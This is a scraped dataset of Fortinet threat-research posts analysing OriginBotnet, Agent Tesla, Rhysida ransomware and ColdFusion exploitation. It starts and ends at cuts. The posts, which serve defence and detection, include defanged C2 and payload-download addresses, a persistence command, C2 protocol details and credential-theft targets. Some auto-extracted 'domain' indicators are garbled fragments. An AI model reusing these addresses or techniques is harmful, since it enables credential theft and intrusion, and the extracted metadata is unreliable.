copied string conforms to the regular expression depicted in Figure 18. It's worth noting that the attacker targets all six supported cryptocurrencies in this scheme. The second file, an Agent Tesla variant, is stored as “COPPER.exe” (SHA256: c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798). This malware can log keystrokes, access the host's clipboard, and conduct disk scans to uncover credentials and other valuable data. Further, it can transmit gathered information to its Command and Control (C2) server through various communication channels, including HTTP(S), SMTP, FTP, or even dispatching it to a designated Telegram channel. To ensure its persistence, the malware replicates itself to the location “%AppData%\\EbJgI\\EbJgI.exe” and establishes itself as an auto-run entry within the system registry, as shown in Figure 20. Additionally, it compiles a list of specific software installed on the victim's device, including web browsers, email clients, FTP clients, and more, as shown in Figure 21. This specific version of Agent Tesla employs SMTP as its C2 connection protocol. You can see the details of the traffic session in Figure 22. The third file, OriginBotnet, is stored as “david.exe” (SHA256: be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7). It is named after its namespace, as seen in Figure 23. OriginBotnet has a range of capabilities, including collecting sensitive data, establishing communications with its C2 server, and downloading additional files from the server to execute keylogging or password recovery functions on compromised devices. Initially, OriginBotnet scans running processes to determine if it is already active within the environment. It then initializes its settings and gathers essential information about the victim’s device, such as the installed AntiVirus Product, CPU, GPU, country, OS name, and username, as shown in Figure 25. Once the system information has been collected, the malware connects with the C2 server at https://nitrosoftwares[.]shop/gate. Figure 26 shows the function responsible for transmitting messages. The communication is conducted via a POST request using a parameter named “p.” The POST data is subjected to TripleDES encryption (in ECB mode, with PKCS7 padding) and subsequently encoded in Base64 format. The encryption key for TripleDES is stored within the “x-key” field of the HTTP Header. Additionally, the Content-Type and User-Agent values are hard-coded as “application/x-www-form-urlencoded” and “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0,” respectively. Figures 27 and 28 provide insights into the traffic capture and decrypted message. After receiving an “OK” signal from the C2 server, OriginBotnet enters a waiting state and proceeds to parse incoming C2 commands. The process for handling these commands is outlined in Figure 28. The available commands include “downloadexecute,” “uninstall,” “update,” and “load.” If the victim receives either the “downloadexecute” or “update” command, the malware proceeds to parse additional parameters, including the URL. It then directly downloads supplementary files from the specified URL and executes them. It selects the appropriate execution method depending on the file’s extension (.exe, .msi, or .java). This may involve using “Process. Start” or invoking commands such as “msiexec.exe /I” or “java.exe -jar,” as shown in Figure 30. When receiving an “uninstall” command, OriginBotnet invokes “MoveFile” to relocate the file to a temporary folder. The final command, “load,” retrieves plugins from the C2 server. The POST session and the decoded data for this specific request are displayed in Figure 31. In this context, two plugins are available for OriginBotnet: Keylogger and PasswordRecovery. The plugin DLL file is transmitted as a Base64 encoded string within the “bytes” parameter. The processing function for this operation is shown in Figure 32. The Keylogger plugin (SHA256: c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c5) is designed to covertly record and log each keystroke executed on a computer as well as monitor user activities. It employs techniques such as “SetWindowsHookEx” for capturing keyboard input events and “GetForegroundWindow” to determine the active window the user is working in. It also keeps tabs on clipboard text content through “SetClipboardViewer.” The stolen text file uses a format similar to Agent Tesla's, as shown in Figure 35. The PasswordRecovery plugin (SHA256: 56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67) retrieves and organizes the credentials of various browser and software accounts. It records these results and reports them via HTTP POST requests. Its primary function is shown in Figure 36. The plugin is designed to target the following browsers and software applications: This cyberattack campaign uncovered by FortiGuard Labs involved a complex chain of events. It began with a malicious Word document distributed via phishing emails, leading victims to download a loader that executed a series of malware payloads. These payloads included RedLine Clipper, Agent Tesla, and OriginBotnet. The attack demonstrated sophisticated techniques to evade detection and maintain persistence on compromised systems. We also provided a comprehensive breakdown of each attack stage, shedding light on the intricacies of the deployed malware and the tactics employed. The malware described in this report are detected and blocked byFortiGuard Antivirusas: MSOffice/Agent. DA32!tr.dldrMSIL/Agent.8DF3!trMSIL/Agent. DGH!trMSIL/Agent. F!tr.spyMSIL/Agent. CSS!tr.spyMSIL/Kryptik. AHUA!trMSIL/Kryptik. PSV!trMSIL/Injector. WGW!trMSIL/Injector. WHL!trMSIL/ClipBanker. PK!trMSIL/Keylogger. ELM!trMSIL/OriginBotnet. G!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. We also suggest our readers go through the freeNSE training: NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. bankslip[.]infosoftwarez[.]onlinenitrosoftwares[.]shop c9e72e2865517e8838dbad0ce41561b2bd75c399b7599c1711350f9408189b9b56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c521ad235118c371e2850c539040b6dcdd88196c021245440155fe80aacf6ccc7e4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798dfd2b218387910b4aab6e5ee431acab864b255832eddd0fc7780db9d5844520af36464557efef14b7ee4cebadcc0e45af46f5c06b67c5351da15391b03a19c4cb15055e75ae0eeb4585f9323ef041fa25ed9b6bf2896b6ea45d871d49a1c72b849c969a5461b2919fd9a7dc7f76dd84101b2acc429b341f8eeee248998e9da3265e47578274d16be1be0f50767bad0af16930df43556dd23d7ad5e4adc2bcbe3 botnet,microsoft office FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/originbotnet-spreads-via-malicious-word-document",
      "scraped_at": "2025-07-20T13:53:34.527790",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ewcrisp",
          "bJgI",
          "avid",
          "udacity",
          "roject",
          "siexec",
          "OPPER",
          "umdisintegration",
          "r",
          "cancopper4647979413",
          "esources",
          "argomind",
          "ackyard",
          "ocument",
          "cancopper46477979413",
          "ava"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798",
          "4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3",
          "56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67",
          "c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c5",
          "be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://softwarez",
          "https://bankslip",
          "https://nitrosoftwares"
        ]
      },
      "threat_score": 0.5154639175257733
    }
  },
  {
    "id": "Fortinet_26720",
    "source": "Fortinet",
    "title": "New Agent Tesla Variant Being Spread by Crafted Excel Document",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity level:Critical Our FortiGuard Labs captured a phishing campaign that spreads a new Agent Tesla variant. This well-known malware family uses a . Net-based Remote Access Trojan (RAT) and data stealer to gain initial access. It is often used for Malware-as-a-Service (MaaS). I performed an in-depth analysis of this campaign, from the initial phishing email to the actions of Agent Tesla installed on the victim’s machine to the collecting of sensitive information from the affected device. In this analysis, you will learn about the contents of this attack, such as how the phishing email starts the campaign, how the CVE-2017-11882/CVE-2018-0802 vulnerability (and not the VBS macro) is exploited to download and execute the Agent Tesla file on the victim’s device, as well as how Agent Tesla collects the sensitive data from the victim’s device, such as the credentials, key loggings, and screenshots of the victim’s screen. Despite fixes forCVE-2017-11882/CVE-2018-0802being released by Microsoft in November, 2017 and January, 2018, this vulnerability remains popular amongst threat actors, suggesting there are still unpatched devices in the wild, even after over five years. We are observing and mitigating3000 attacks per day, at the IPS level. The number of observed vulnerable devices isaround 1300per day. The phishing email is disguised as a Purchase Order notification, shown in Figure 1.1, that asks for the recipient to confirm an order from an industrial equipment supplier company. An Excel document is attached to this email called “Order 45232429.xls”. The attached Excel document is in OLE format. It contains crafted equation data that exploits the CVE-2017-11882/CVE-2018-0802 vulnerability to execute a malicious shellcode. Opening the attached Excel document displays a deceptive message to the user (Figure 2.1). Meanwhile, the shellcode inside the crafted equation data is secretly executed. CVE-2017-11882/CVE-2018-0802 is an RCE (remote code execution) vulnerability that results in memory corruption inside the EQNEDT32. EXE process when parsing the crafted equation data when exploited. This can lead to arbitrary code execution. Figure 2.2 shows the Excel document parsed in an OLE compound reader, where the equation data is inside the stream “\\x01Ole10NativE” under the storage folder “MBD0057E612”. Once the crafted Excel document is opened, the malicious equation data is parsed automatically by an MS Office process called “EQNEDT32. EXE.” This triggers the CVE-2017-11882/CVE-2018-0802 vulnerability, and the malicious shellcode inside the equation data is executed in the background. In Figure 2.3, we can see that the crafted equation data overrides the stack of the EQNEDT32. EXE and makes it jump twice (through the fixed addresses of 0x450650 and 0x44C329) to the shellcode at 0x33C006C (in the stack). After self-decryption, we observe that the shellcode’s main job is downloading and executing an additional malware file from the URL “hxxp://23[.]95.128.195/3355/chromium.exe”. To do this, it calls several APIs, such as URLDownloadToFileW(), to download the malware to a local folder, and ShellExecuteW() to run the malware on the victim’s device. In Figure 2.4, we can see that the shellcode is about to call the API URLDownloadToFileW() to download it into a local file and rename it as “dasHost.exe” under the “%TEMP%” folder. The downloaded file (“dasHost.exe”) is a . Net program protected by two packers, IntelliLock and . NET Reactor. Figure 3.1 displays the EntryPoint function of the downloaded file inside dnSpy, where the assembly name of the file is “Nvgqn7x”. As you may have noticed, all the names of the namespaces, classes, methods, and variables are thoroughly obfuscated. There are resource files inside the downloaded file’s . Net Resources section. The downloaded file (“dasHost.exe”) extracts two fileless execution modules from the . Net Resources section. One is the payload module of Agent Tesla, and the other is a Loader module to the payload file of Agent Tesla. Figure 3.2 shows all the resources in the . Net Resources section. According to my analysis, the resource \"rTMIRNhcvIYnT8lMa6. UJQcCvWAsvT8GV6hyn.resources\" is the encoded Loader module, whose assembly name is “Cassa.” The resource \"FinalProject. Resources\" is the encrypted and compressed Agent Tesla payload module, whose assembly name is “NyZELH bX.” It gets decrypted, decompressed, and loaded as a module in the “DeleteMC()” function of the Loader module, as shown in Figure 3.3. As you may have noticed, the resource is disguised as a Bitmap resource and is mixed up with the payload. Bitmap. GetPixel() and Color. FromArgb() are the two APIs being called to read the payload from the resource. It then goes through decryption and gzip decompression to restore the payload file, which is loaded as an executable module by calling the AppDomain. CurrentDomain. Load() method. Finally, the payload file’s “EntryPoint” function is invoked from the Loader module (“Cassa”). The payload module is a . Net program and is fully obfuscated. Fortunately, I managed to have it de-obfuscated using several analysis tools. As with most malware, the developers run the malware’s core module in a separate process. This is a common protection strategy to increase the malware's chance of survival on the victim's device. The primary function (other than persistence) of the payload is to perform the process hollowing and then place another decrypted executable file—sourced from a separate resource (called “7gQsJ0ugxz.resources”) within the payload file—onto the hollowed process and execute it. In this analysis, I call this decrypted executable file the core module of Agent Tesla. Figure 4.1 contains the key APIs the payload module invokes to perform the ProcessHollowing. It invokes CreateProcess() to create a suspended process of “dasHost.exe.” Next, it allocates memory in this process via the API VirtualAllocEx() for the core module. Then WriteProcessMemory() is invoked numerous times to copy the core module, saved in the array variable byte_1, onto the new process. It finally calls the APIs SetThreadContext() and ResumeThread() to restore the new process from a suspended state to execute the core module of Agent Tesla. After that, the payload module exits by calling Environment. Exit() in the Loader module’s DeleteMC() (refer to Figure 3.3). To persist in collecting the victim’s sensitive data, even if the affected system is restarted or the Agent Tesla process is killed, it does the following two things. It executes a command to create a task in the system TaskScheuler inside the payload module. The command in my analysis environment is \"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"Updates\\kCqKCO\" /XML \"C:\\Users\\Bobs\\AppData\\Local\\Temp\\tmp68E9.tmp,\" where \"Updates\\kCqKCO\" is the task name and \"/XML\" specifies it’s been created from an XML file that is provided by following a parameter (i.e. tmp68E9.tmp). Figure 5.1 shows the details of the XML content, where the file “C:\\Users\\Bobs\\AppData\\Roaming\\kCqKCO.exe” is a duplication of the downloaded “dasHost.exe.” The task is set to start at the victim’s logon. The core module adds an auto-run item in the system registry“C:\\Users\\Bobs\\AppData\\Roaming\\sOFvE\\sOFvE.exe” (shown in Figure 5.2). It is another duplication of “dasHost.exe” that is launched automatically at system startup. The Agent Tesla core module collects sensitive information from the victim’s device. This information includes the saved credentials of some software, the victim’s keylogging information, and screenshots of the victim’s device. It steals saved credentials from specified software installed on the victim’s device, including web browsers, email clients, FTP clients and more. Based on their features, the affected software can be categorized as below: \"Opera Browser\", \"Yandex Browser\", \"Iridium Browser\", \"Chromium\", \"7Star\", \"Torch Browser\", \"Cool Novo\", \"Kometa\", \"Amigo\", \"Brave\", \"CentBrowser\", \"Chedot\", \"Orbitum\", \"Sputnik\", \"Comodo Dragon\", \"Vivaldi\", \"Citrio\", \"360 Browser\", \"Uran\", \"Liebao Browser\", \"Elements Browser\", \"Epic Privacy\", \"Coccoc\", \"Sleipnir 6\", \"QIP Surf\", \"Coowon\", \"Chrome\", \"Flock Browser\", \"QQ Browser\", \"IE/Edge\", \"Safari\", \"UC Browser\", \"Falkon Browser\". \"Outlook\", \"ClawsMail\", \"IncrediMail\", \"FoxMail\", \"eM Client\", \"Opera Mail\", \"PocoMail\", \"Windows Mail App\", \"Mailbird\", \"The Bat!\", \"Becky!\", \"Eudora\". \"Flash FXP\", \"WS_FTP\", \"FTPGetter\", \"SmartFTP\", \"FTP Navigator\", \"FileZilla\", \"CoreFTP\", \"FtpCommander\", \"WinSCP\". \"NordVPN\", \"Private Internet Access\", \"OpenVPN\", \"Discord\", \"Trillian\", \"Psi/Psi+\". \"Mysql Workbench\", \"\\Microsoft\\Credentials\\\", \"Internet Download Manager\", \"JDownloader\". Agent Tesla calls the API SetWindowsHookEx() to set a keyboard hook to monitor low-level input events. In Figure 6.2, the callback hook procedure “this. EiqpViCm9()” is called whenever the victim is typing on their device. Agent Tesla records the program title, time, and victim’s keyboard input contents into a local file “%Temp%/log.tmp” from time to time. It also has a method called by a Timer every 20 minutes to check the “log.tmp” file and submit its content via SMTP. In the core module, Agent Tesla sets another Timer with a 20-minute interval to call another Timer function. This Timer function checks for any activity on the device and determines whether to record the screenshot and submit it. To do this, it calls the API GetLastInputInfo() to retrieve the time of the last input event received by the system and then compare it with the current time. The following pseudo-code snippet illustrates how Agent Tesla captures a screenshot. bitmap = newBitmap(bounds. Width, Screen. PrimaryScreen. Bounds. Height);encoderParameters = new EncoderParameters(1);encoder = 25Tl1j7fiou. KIOsJnSv3(ImageFormat. Jpeg);EncoderParameter encoderParameter = newEncoderParameter(Encoder. Quality, (long)Convert. ToInt32(60L));encoderParameters. Param[0] = encoderParameter;graphics = Graphics. FromImage(bitmap);graphics. CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);bitmap. Save(memoryStream, encoder, encoderParameters); The “memoryStream” variable saves the screenshot in jpeg format. Agent Tesla provides multiple ways to submit the stolen data, such as using the HTTP POST method or as the body of an email over SMTP. This variant chooses to submit the data collected from the victim’s device over email SMTP protocol. The SMTP server address and port hardcoded in the variant are \"mail.daymon.cc\" and 587. Figure 7.1 shows the malware about to call the smtpClient. Send() function to submit credentials data. The email subject starts with the keyword “PW_” followed by the User name/Computer name for credentials data. The email body is formatted in HTML. It is shown in Figure 7.2 when parsing the email body as HTML in a browser. The email’s subject is “KL_{User name/Computer name},” where KL is short for keylogger, and the email body is the collected keylogging data. As displayed in Figure 7.3, the email body includes the records of my keystrokes typed in a Notepad titled “Untitled - Notepad.” The captured screenshot is kept in a variable and added as an email attachment when submitted to the attacker. Figure 7.4 shows it about to add screenshot data to the email as an attachment. The email subject format for ScreenShots is “SC_{User name/Computer name},” and the email body is just the basic information about the victim’s device. The following flowchart roughly describes the outline of the malicious campaign. This analysis shows that a malicious Excel document attached to a phishing email exploits an aging security vulnerability to execute a shellcode that downloads Agent Tesla. It keeps relevant modules encrypted and encoded in the Resource section to protect its core module from being analyzed. I then explained how this variant establishes persistence on the victim’s device. I also showed the kind of software and data Agent Tesla is able to steal from the infected device, including credentials, keylogging data, and active screenshots. Lastly, I provided several examples of the kind of sensitive data this variant of Agent Tesla obtained from my analysis environment and how this stolen sensitive data is submitted to the attacker via emails over SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached Excel document and the downloaded file with AV signatures “MSExcel/CVE_2017_11882. EQMA!exploit” and “MSIL/AgentTesla. BEDA!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Hxxp[:]//23[.]95.128.195/3355/chromium.exe SMTP server @ mail.daymon.cc:587 [Order 45232429.xls]FDC04DC72884F54A4E553B662F1F186697DAF14EF8A2DC367BC584D904C22638 [chromium.exe / dasHost.exe / downloaded file]36B17C4534E34B6B22728DB194292B504CF492EF8AE91F9DDA7702820EFCFC3A Agent Tesla FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/agent-tesla-variant-spread-by-crafted-excel-document",
      "scraped_at": "2025-07-20T13:53:42.251293",
      "indicators": {
        "ip_address": [],
        "domain": [
          "chtasks",
          "JQcCvWAsvT8GV6hyn",
          "ail",
          "5232429",
          "asHost",
          "mp68E9",
          "OFvE",
          "og",
          "gQsJ0ugxz",
          "CqKCO",
          "hromium"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "36B17C4534E34B6B22728DB194292B504CF492EF8AE91F9DDA7702820EFCFC3A",
          "FDC04DC72884F54A4E553B662F1F186697DAF14EF8A2DC367BC584D904C22638"
        ],
        "cve": [
          "CVE-2017-11882",
          "CVE-2018-0802"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.35398230088495575
    }
  },
  {
    "id": "Fortinet_39119",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Rhysida",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Rhysida ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Rhysida ransomware is a new ransomware group that uses aRansomware-as-a-Service (RaaS)model consisting of developers who create and provide ransomware, the infrastructure needed to operate it, and affiliates who execute attacks against victims. Its first ransomware sample was submitted to a public file scanning service in May 2023. On August 4, 2023, the Health Sector Cybersecurity Coordination Center (HC3)releaseda sector alert for the Rhysida ransomware. According to the HC3 alert, Rhysida threat actors rely on phishing attacks as an infection vector. The attackers also reportedly use Cobalt Strike for lateral movement within the victim's network and to deliver payloads. Cobalt Strike is advertised as an adversary emulation tool for information security professionals to evaluate network and system defenses. However, cybercriminals often abuse it to compromise networks and create persistent communication channels between the attacker and the victim. The leak site used by the Rhysida group to auction and expose victim data currently lists 41 victims. While Rhysida has hit organizations around the globe, more than 50% of affected organizations are located in Europe, with North America a distant second. Organizations in Asia Pacific (APAC), Latin America, the Middle East, and Africa were also affected. The education sector accounts for more than 30% of its victims—with one exception, all of the affected organizations in the education sector are located in Europe and North America—followed by manufacturing, government, and IT. According to information on the data leak site, the largest amount of data (1.6 TB) was stolen from a European government agency. After compromising the victim’s network, Rhysidia likely deploys Cobalt Strike to move laterally across the network and function as its command and control center. The ransomware finds and encrypts data using the ChaCha algorithm, adding a “.rhysida” extension to the affected files. Rhysida ransomware avoids encrypting files that have the following file extensions: It also avoids encrypting files in the following folders: One of the earlier Rhysida ransomware samples (SHA2: a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6) drops a ransom note in PDF titled “CriticalBreachDetected.pdf.” The ransom note has Rhysida’s TOR site address, which victims are asked to visit to contact the attacker. The sample claims to have been created on May 15, 2023. The attacker appears to have created a new variant (SHA2: 258ddd78655ac0587f64d7146e52549115b67465302c0cbd15a0cba746f05595) on May 17 that drops a ransom note with the same title. However, the threat actor has also included a couple of email addresses as an alternative means of contact, probably in case victims are unfamiliar with TOR. One of the Rhysida samples we examined replaced the desktop wallpaper with the same ransom message as the dropped PDF file. Even though our analysis revealed minor differences such as those mentioned above, all of the Rhysida ransomware samples that FortiGuard Labs have collected are marked as version 0.1. The Rhysida group also operates a data leak site on TOR for ransom negotiations and exposing data stolen from the victims. At the time of our investigation, the most recent victim was a US organization in the education sector. The threat actor had demanded a ransom of 10 Bitcoins (as of August 22, 2023, one Bitcoin is worth approximately $26,000 US). However, as shown in Figure 7, the threat actor may be willing to negotiate a ransom if the counteroffer is not insultingly low. The leaks site displays stolen data in a file tree format and provides a search function. Fortinet customers are already protected from these malware variants through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Rhysida ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6 Rhysida ransomware 67a78b39e760e3460a135a7e4fa096ab6ce6b013658103890c866d9401928ba5 d5c2f87033a5baeeb1b5b681f2c4a156ff1c05ccd1bfdaf6eae019fc4d5320ee 1a9c27e5be8c58da1c02fc4245a07831d5d431cdd1a91cd35d2dd0ad62da71cd 258ddd78655ac0587f64d7146e52549115b67465302c0cbd15a0cba746f05595 0bb0e1fcff8ccf54c6f9ecfd4bbb6757f6a25cb0e7a173d12cf0f402a3ae706f f6f74e05e24dd2e4e60e5fb50f73fc720ee826a43f2f0056e5b88724fa06fbab 3d2013c2ba0aa1c0475cab186ddf3d9005133fe5f88b5d8604b46673b96a40d8 2c5d3fea7ad3c9c49e9c1a154370229c86c48fbaf7044213fd85d31efcebf7f6 3518195c256aa940c607f8534c91b5a9cd453c7417810de3cd4d262e2906d24f Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). threat research,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-rhysida",
      "scraped_at": "2025-07-20T13:53:50.853919",
      "indicators": {
        "ip_address": [],
        "domain": [
          "riticalBreachDetected"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "f6f74e05e24dd2e4e60e5fb50f73fc720ee826a43f2f0056e5b88724fa06fbab",
          "1a9c27e5be8c58da1c02fc4245a07831d5d431cdd1a91cd35d2dd0ad62da71cd",
          "a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6",
          "0bb0e1fcff8ccf54c6f9ecfd4bbb6757f6a25cb0e7a173d12cf0f402a3ae706f",
          "3d2013c2ba0aa1c0475cab186ddf3d9005133fe5f88b5d8604b46673b96a40d8",
          "2c5d3fea7ad3c9c49e9c1a154370229c86c48fbaf7044213fd85d31efcebf7f6",
          "67a78b39e760e3460a135a7e4fa096ab6ce6b013658103890c866d9401928ba5",
          "258ddd78655ac0587f64d7146e52549115b67465302c0cbd15a0cba746f05595",
          "3518195c256aa940c607f8534c91b5a9cd453c7417810de3cd4d262e2906d24f",
          "d5c2f87033a5baeeb1b5b681f2c4a156ff1c05ccd1bfdaf6eae019fc4d5320ee"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6266318537859009
    }
  },
  {
    "id": "Fortinet_68093",
    "source": "Fortinet",
    "title": "Multiple Threats Target Adobe ColdFusion Vulnerabilities",
    "text": "FortiGuard Labs Threat Research Affected platforms:Windows and macOSImpacted parties:Users of vulnerable versions of Adobe ColdFusionImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical This past July, Adobe responded to reports of exploits targeting pre-authentication remote code execution (RCE) vulnerabilities in their ColdFusion solution by releasing a series of security updates:APSB23-40,APSB23-41, andAPSB23-47. An in-depthanalysisof those exploits has been documented by Project Discovery, including a significant vulnerability in the WDDX deserialization process within Adobe ColdFusion 2021. Since those updates, however, FortiGuard Labs IPS telemetry data has continued to detect numerous efforts to exploit the Adobe ColdFusion deserialization of untrusted data vulnerability, which poses a significant risk of arbitrary code execution (Figure 1). These attacks include probing, establishing reverse shells, and deploying malware for subsequent actions. This article provides a detailed analysis of how this threat group exploits the Adobe ColdFusion vulnerability. The targeted URI of the attack is “/CFIDE/adminapi/accessmanager.cfc,” which serves as a legitimate ColdFusion Component (CFC) endpoint. Attackers attempt to inject their payload into the “argumentCollection“ parameter through a POST request. A thorough packet capture illustrating this process is depicted in Figure 2. In July, we detected numerous active probing activities related to aninteractshtool that can generate specific domain names to help researchers test whether an exploit is successful (Figure 3). However, attackers can also use it to validate vulnerabilities via monitoring the domain. We collected the following domains related to similar probing activity, shown in Figure 4, including mooo-ng[.]com, redteam[.]tf, and h4ck4fun[.]xyz. Our analysis showed attackers are using a reverse shell, often called a remote shell or \"connect-back shell,\" to attempt to exploit vulnerabilities within a target system by initiating a shell session, thereby enabling access to the victim’s computer. Some exploits directed at the Adobe ColdFusion vulnerability use payloads encoded in Base64. The original data can be seen in Figure 5, while the decoded data is presented in Figure 6. Based on the data we’ve gathered, the attacks originate from multiple distinct IP addresses, including 81[.]68[.]214[.]122, 81[.]68[.]197[.]3 and 82[.]156[.]147[.]183. These payloads are also encoded in Base64 (Figure 7). We also observed that the threat actor distributed this malware from the same server 103[.]255[.]177[.]55[:]6895, as revealed by the decoded information in Figure 8. The server (103[.]255[.]177[.]55[:]6895) is a publicly accessible HTTP file server and we can observe the campaign’s progress through it. During our analysis, certain files proved especially challenging to trace due to frequent updates made by the attacker. The modifications to the files on the HFS public server are shown in Figure 9, showcasing the alterations made on 8/24. We also identified four malware variants being used in these attacks. The first entity is XMRig Miner, software that leverages computer processing cycles to mine for the Monero cryptocurrency. It can be used for legitimate mining or be abused by cybercriminals by hijacking CPU cycles. This attack uses version 6.20.0, shown in Figure 10. The second entity is Satan DDoS/Lucifer, a hybrid bot that combines cryptojacking and distributed denial of service (DDoS) functionalities. Lucifer was first reported in 2020. Beyond deploying the XMRig miner in this case, it demonstrates adeptness in command and control (C2) operations and can propagate by exploiting numerous vulnerabilities and employing credential brute-forcing. It also supports TCP, UDP, and HTTP-based DDoS attacks. Researchers initially identified Lucifer as targeting and operating on Windows-based systems, but from the welcome message in Figure 11, we can see that this variant targets Linux. Lucifer establishes persistence by configuring registry key values under “\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It also employs “schtasks” to initialize its miner parameter and create a recurring task for persistence, as shown in Figure 12. The third entity is known as RudeMiner. This isn’t the first instance of its association with Lucifer. As shown in the wallet information labeled 